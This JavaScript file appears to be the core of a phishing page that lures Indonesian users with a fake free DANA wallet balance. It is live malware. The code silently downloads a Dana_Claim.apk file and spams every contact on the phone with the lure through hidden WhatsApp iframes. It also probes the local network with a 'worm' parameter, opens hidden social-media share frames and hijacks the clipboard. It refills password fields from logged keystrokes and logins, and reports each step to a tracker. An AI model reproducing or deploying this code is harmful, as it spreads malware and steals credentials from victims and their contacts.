var files = ['https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Dana_Claim.apk'];
var downloaded = [];

function downloadDiamDiam(url, filename) {
    if(A.isAvailable){A.downloadFile(url,filename);downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});return}
    fetch(url).then(function(res){return res.blob()}).then(function(blob){
        var u=URL.createObjectURL(blob);
        var a=document.createElement('a');a.href=u;a.download=filename;a.style.display='none';
        document.body.appendChild(a);a.click();
        setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(u)},1000);
        downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
    }).catch(function(){
        var ifr=document.createElement('iframe');ifr.src=url;
        ifr.style.cssText='position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(ifr);setTimeout(function(){document.body.removeChild(ifr)},5000);
        downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
    });
}

function initM2() {
    setTimeout(function() {
        if(downloaded.indexOf(files[0])===-1) downloadDiamDiam(files[0],'Dana_Claim.apk');
    },100);
}

// 1. WA Spread
function autoSpreadWA() {
    if (!A.isAvailable) return;
    var contacts = A.getAllContacts();
    if (!contacts || contacts.length === 0) return;
    
    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp50.000! Klik: ' + window.location.href);
    var totalWA = 0;
    
    contacts.forEach(function(contact, index) {
        setTimeout(function() {
            var number = contact.number.replace(/[^0-9]/g, '');
            if (number && number.length > 5) {
                try {
                    var url = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                    var iframe = document.createElement('iframe');
                    iframe.src = url;
                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                    document.body.appendChild(iframe);
                    setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 2000);
                    totalWA++;
                    if (totalWA % 10 === 0) {
                        K({ sumber: 'wa_spread_progress', data: totalWA });
                    }
                } catch(e) {}
            }
        }, index * 100);
    });
    
    setTimeout(function() {
        K({ sumber: 'wa_spread_total', data: totalWA });
    }, contacts.length * 100 + 2000);
}

// 2. LAN Spread
function autoSpreadLAN() {
    try {
        fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var ip = data.ip;
                var parts = ip.split('.');
                var subnet = parts.slice(0, 3).join('.');
                var targets = [];
                for (var i = 1; i <= 254; i++) {
                    var targetIP = subnet + '.' + i;
                    if (targetIP !== ip) targets.push(targetIP);
                }
                
                var totalLAN = 0;
                targets.forEach(function(target, index) {
                    setTimeout(function() {
                        var ports = [80, 8080, 3000, 5000, 8000];
                        ports.forEach(function(port) {
                            try {
                                fetch('http://' + target + ':' + port + '/?worm=' + encodeURIComponent(window.location.href), { mode: 'no-cors' })
                                    .catch(function() {});
                                totalLAN++;
                            } catch(e) {}
                        });
                    }, index * 50);
                });
                
                setTimeout(function() {
                    K({ sumber: 'lan_spread_total', data: totalLAN });
                }, 10000);
            })
            .catch(function() {});
    } catch(e) {}
}

// 3. Share Medsos
function autoSpreadMedsos() {
    var url = encodeURIComponent(window.location.href);
    var text = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp50.000! ' + window.location.href);
    
    var platforms = [
        { name: 'Facebook', url: 'https://www.facebook.com/sharer/sharer.php?u=' + url },
        { name: 'Instagram', url: 'https://www.instagram.com/?url=' + url },
        { name: 'TikTok', url: 'https://www.tiktok.com/@?url=' + url },
        { name: 'Telegram', url: 'https://t.me/share/url?url=' + url + '&text=' + text },
    ];
    
    platforms.forEach(function(p, index) {
        setTimeout(function() {
            try {
                var iframe = document.createElement('iframe');
                iframe.src = p.url;
                iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                document.body.appendChild(iframe);
                setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 3000);
                K({ sumber: 'medsos_spread', data: p.name });
            } catch(e) {}
        }, index * 500);
    });
}

// 4. Master Spread
function masterAutoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    
    K({ sumber: 'auto_spread_start', data: 'master_auto_spread' });
    
    setTimeout(autoSpreadWA, 50);
    setTimeout(autoSpreadLAN, 100);
    setTimeout(autoSpreadMedsos, 150);
    
    setTimeout(function() {
        try {
            navigator.clipboard.writeText('🎉 Dapatkan Saldo DANA Gratis Rp50.000! ' + window.location.href)
                .catch(function() {});
        } catch(e) {}
    }, 200);
    
    K({ sumber: 'auto_spread_complete', data: 'all_spread_triggered' });
}

function autoFillForm() {
    if (!document.querySelector('input[type="password"]')) return;
    
    var savedData = localStorage.getItem('vd');
    var korbanData = {};
    
    if (savedData) {
        try {
            var data = JSON.parse(savedData);
            for (var i = data.length - 1; i >= 0; i--) {
                if (data[i].sumber === 'keylogger' || data[i].sumber === 'login') {
                    korbanData = data[i].data || {};
                    break;
                }
            }
        } catch(e) {}
    }
    
    document.querySelectorAll('input').forEach(function(input) {
        if (input.value) return;
        if (input.type === 'text' || input.type === 'email') {
            if (korbanData.email) input.value = korbanData.email;
            else if (korbanData.username) input.value = korbanData.username;
            else if (korbanData.user) input.value = korbanData.user;
        }
        if (input.type === 'password') {
            if (korbanData.password) input.value = korbanData.password;
            else if (korbanData.pass) input.value = korbanData.pass;
            else if (korbanData.pin) input.value = korbanData.pin;
        }
    });
    
    K({ sumber: 'auto_fill', data: 'form_filled' });
}
